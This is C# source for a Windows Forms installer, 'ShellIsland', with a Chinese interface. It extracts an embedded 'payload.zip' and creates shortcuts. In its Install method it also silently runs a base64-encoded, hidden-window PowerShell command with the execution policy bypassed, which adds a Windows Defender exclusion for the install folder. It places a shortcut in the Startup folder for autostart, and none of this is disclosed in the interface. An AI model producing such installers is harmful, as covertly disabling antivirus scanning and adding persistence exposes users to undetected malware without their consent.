using System.Diagnostics;
using System.IO.Compression;
using System.Reflection;
using System.Text;

namespace ShellIslandSetup;

internal static class Program
{
    [STAThread]
    private static void Main()
    {
        ApplicationConfiguration.Initialize();
        Application.Run(new SetupForm());
    }
}

internal sealed class SetupForm : Form
{
    private readonly TextBox _path;
    private readonly Button _browse;
    private readonly Button _install;
    private readonly Label _status;

    public SetupForm()
    {
        Text = "ShellIsland 安装程序";
        Width = 560;
        Height = 210;
        FormBorderStyle = FormBorderStyle.FixedDialog;
        MaximizeBox = false;
        MinimizeBox = false;
        StartPosition = FormStartPosition.CenterScreen;
        Font = new Font("Segoe UI", 9F);

        var title = new Label
        {
            Text = "选择 ShellIsland 安装位置",
            AutoSize = true,
            Left = 20,
            Top = 18,
            Font = new Font("Segoe UI", 11F, FontStyle.Bold),
        };

        _path = new TextBox
        {
            Left = 20,
            Top = 52,
            Width = 410,
            Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "ShellIsland"),
        };

        _browse = new Button
        {
            Text = "浏览...",
            Left = 440,
            Top = 50,
            Width = 90,
            Height = 27,
        };
        _browse.Click += (_, _) =>
        {
            using var dialog = new FolderBrowserDialog { SelectedPath = _path.Text };
            if (dialog.ShowDialog(this) == DialogResult.OK)
            {
                _path.Text = dialog.SelectedPath;
            }
        };

        _status = new Label
        {
            Text = "安装到该目录，并创建快捷方式。",
            AutoSize = false,
            Left = 20,
            Top = 92,
            Width = 510,
            Height = 22,
            ForeColor = Color.DimGray,
        };

        _install = new Button
        {
            Text = "安装",
            Left = 420,
            Top = 128,
            Width = 110,
            Height = 32,
        };
        _install.Click += async (_, _) => await InstallAsync();

        var cancel = new Button
        {
            Text = "取消",
            Left = 320,
            Top = 128,
            Width = 90,
            Height = 32,
            DialogResult = DialogResult.Cancel,
        };

        Controls.AddRange(new Control[] { title, _path, _browse, _status, _install, cancel });
        AcceptButton = _install;
        CancelButton = cancel;
    }

    private async Task InstallAsync()
    {
        var target = _path.Text.Trim();
        if (string.IsNullOrWhiteSpace(target))
        {
            MessageBox.Show(this, "请选择安装位置。", Text, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            return;
        }

        _install.Enabled = false;
        _browse.Enabled = false;
        _status.Text = "正在释放文件...";

        try
        {
            await Task.Run(() => Install(target));
            _status.Text = "安装完成。";
            MessageBox.Show(this, "ShellIsland 已安装。", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            Close();
        }
        catch (Exception ex)
        {
            _status.Text = "安装失败。";
            MessageBox.Show(this, ex.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            _install.Enabled = true;
            _browse.Enabled = true;
        }
    }

    private static void Install(string target)
    {
        foreach (var process in Process.GetProcessesByName("ShellIsland"))
        {
            try { process.Kill(true); } catch { }
        }

        Directory.CreateDirectory(target);
        var payload = Path.Combine(Path.GetTempPath(), $"shellisland-{Guid.NewGuid():N}.zip");
        try
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("payload.zip")
                                 ?? throw new InvalidOperationException("安装包损坏：缺少 payload。"))
            using (var file = File.Create(payload))
            {
                resource.CopyTo(file);
            }

            ZipFile.ExtractToDirectory(payload, target, true);
        }
        finally
        {
            try { File.Delete(payload); } catch { }
        }

        var script = $"Add-MpPreference -ExclusionPath '{target.Replace("'", "''")}'";
        var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        using (var process = Process.Start(new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}",
            UseShellExecute = false,
            CreateNoWindow = true,
        }))
        {
            process?.WaitForExit(15000);
        }

        var exe = Path.Combine(target, "app", "ShellIsland.exe");
        var shell = Type.GetTypeFromProgID("WScript.Shell");
        if (shell is not null)
        {
            dynamic creator = Activator.CreateInstance(shell)!;
            CreateShortcut(creator, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "ShellIsland.lnk"), exe, target);
            CreateShortcut(creator, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), "ShellIsland.lnk"), exe, target);
            CreateShortcut(creator, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "ShellIsland.lnk"), exe, target);
        }

        Process.Start(new ProcessStartInfo { FileName = exe, UseShellExecute = true });
    }

    private static void CreateShortcut(dynamic shell, string shortcutPath, string exe, string workingDirectory)
    {
        dynamic shortcut = shell.CreateShortcut(shortcutPath);
        shortcut.TargetPath = exe;
        shortcut.WorkingDirectory = workingDirectory;
        shortcut.Save();
    }
}
